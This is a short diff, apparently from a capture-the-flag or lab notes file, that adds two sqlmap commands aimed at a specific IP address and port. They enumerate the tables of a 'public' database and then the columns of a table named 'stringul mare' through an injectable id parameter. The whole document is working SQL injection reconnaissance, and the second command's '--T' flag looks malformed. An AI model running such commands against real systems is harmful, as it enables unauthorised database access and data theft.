@@ -1,0 +1,2 @@
+sqlmap -u http://34.107.72.222:31819/user?id=1 -D public --tables
+sqlmap -u http://34.107.72.222:31819/user?id=1 -D public --T 'stringul mare' --columns
